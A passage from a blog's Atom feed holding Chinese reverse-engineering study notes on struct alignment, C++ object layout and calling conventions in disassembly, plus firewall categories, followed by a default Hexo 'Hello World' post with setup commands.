class="hljs-symbol">.text:</span>000000000040159E                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>000000000040159F                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>000000000040159F main            endp<br></code></pre></td></tr></table></figure><p>​    编译器对齐值,设置为 alg, MeMber offset 从0开始计算, 其中Member offset 要每次代入公式之后,加上自己成员所占的字节大小,继续参与下次运算</p><p>　　结构体成员偏移计算公式:  MeMber offset % min(alg,sizeof(Member type)) == 0</p><p>　　结构体总大小计算公式: 　 sizeof(struct) % min(Max type size,alg) == 0;</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>​    （对象调用成员函数时） lea ecx, [xxx]<br>​    (成员函数中) mov xxx，ecx ; 直接就使用了ecx call 成员函数 stdcall和cdec方式都是push传参（最后一个PUSH）<br>​    lea reg, 寄存器首地址 push reg call 成员函数<br>​    当给函数传参时第一个参数是地址，那么可以怀疑这个是类对象的成员函数 对象作为参数传递<br>​    成员简单：直接当作变量压栈，先定义的成员后压栈，后定义的成员先压栈（保证在栈中的 顺序和定义时一样）<br>​    成员复杂：将整个对象复制到栈顶（相当于整个压栈），具体操作<br>​    sub esp, 类对象长度 ; 预先申请栈空间，用于存储类对象的形参 mov ecx, 10<br>​    ;设置循环次数10次<br>​    rep movs 栈顶，对象地址 ;就是类似memcpy，将内容整体拷贝到栈顶（刚刚开辟的位置） call fun…<br>​    对象作为返回值 调用前会将对象返回的位置作为参数压栈（也就是调用方准备好空间，告诉子函数地址，到<br>时候子函数返回的过程就是直接写进那个地址）</p><p>​    空类的实例占用1字节：目的是为了能够获取到该实例的地址 对象中先定义的变量在低地址处，后定义的变量在高地址处（类似数组） 内存对齐：<br>​    每个数据存放的地址必须是自身长度的整数倍 2结构体总长度必须是数据中最长类型长度的整数倍 如果指定了#pragma pack(n)，则原值和n取min 编译器用0xCC填充<br>​    类中静态变量：是具有作用域的全局变量（同静态变量） 所以静态成员变量可以生成对象就使用（用类访问） 也无需this指针<br>​    this指针：在对象调用自己的成员函数时，会MOV ecx, 对象首地址，而进入成员函数时会自动将 ecx入栈，也就是说，实际上函数多了一个参数，是指向自己对象首地址的指针，这就是this指 针。<br>​    thiscall方式特点：使用ecx传this指针</p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>​    什么是防火墙 – 一种高级访问控制设备，置于<strong>不同网络安全域 之间的一系列部件的组合</strong>，它是<strong>不同网络安全 域间通信流的唯一通道</strong>，能根据企业有关的安全政策控制（允许、拒绝、监视、记录）进出网络的访问行为。</p><p>1.简单包过滤防火墙：（综合安全性最差） </p><p>① 简单包过滤防火墙不检查数据区 ② 简单包过滤防火墙不建立连接状态表 ③ 前后报文无关 ④ 应用层控制很弱 ⑤ 处理对象：单个包报头</p><p>2.状态检测包过滤防火墙 </p><p>① 不检查数据区 ② 建立连接状态表 ③ 前后报文相关 ④ 应用层控制很弱 ⑤ 处理对象：单个包报头</p><p>3.应用代理防火墙</p><p>只检查数据，不查ip，tcp报头，不建立连接表，网络层保护较弱，处理数据包</p><p>4.核检测防火墙（综合安全性最好） </p><p>检查多个报文的会话，协议还原，上下文相关，处理一次对话</p><p>软件防火墙：保护整个网络 单机防火墙：保护澹台主机</p><p>防火墙的其他功能： 身份认证；审计、日志分析；带宽管理；负载均衡；与 IDS 联动；与病毒网关联动；与URL 服务<br>器联动；Mac 绑定；Map 映射…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="逆向" scheme="https://d3n13d.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://d3n13d.github.io/2022/01/07/hello-world/"/>
    <id>https://d3n13d.github.io/2022/01/07/hello-world/</id>
    <published>2022-01-07T07:22:50.495Z</published>
    <updated>2022-01-07T07:22:50.495Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
</feed>
